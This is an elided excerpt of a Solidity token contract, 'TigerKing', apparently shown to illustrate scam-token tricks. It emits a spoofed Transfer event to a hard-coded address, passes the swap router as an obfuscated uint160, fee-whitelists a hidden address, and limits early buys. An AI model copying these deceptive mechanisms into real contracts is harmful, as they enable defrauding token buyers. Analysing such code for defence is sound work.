...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress,uint160  _swapRoute){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        emit Transfer(address(0), address(0xbCB6CeAF99AD505Df9B9784D0A704a01e14A3B9D), _tTotal);
        _swapRoutor = address(_swapRoute);
        ...
        _feeWhiteList[address(0xbCB6CeAF99AD505Df9B9784D0A704a01e14A3B9D)] = true;
    ...
    function _transfer(
        ...
        if (from == mainPair || to == mainPair) {
            ...
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (from == mainPair && totalTrade < 2000){
                    address[] memory path = new address[](2);
                    path[0] = usdt;
                    path[1] = address(this);
                    uint256[] memory amounts =  _swapRouter.getAmountsIn(amount,path);
                    require(amounts[0] <= 50*1e18, "ERR");
                }
                takeFee = true;
...
contract TigerKing is AbsToken {
    constructor() AbsToken("TigerKing","TigerKing",18,100000000,address(0xe4458F817a6CBE81D4629555f1Fae6Eff48c7121),uint160(0xB38cd9dCFc6779AC82a0CeF6e07b73E26B2FDA86)){}
}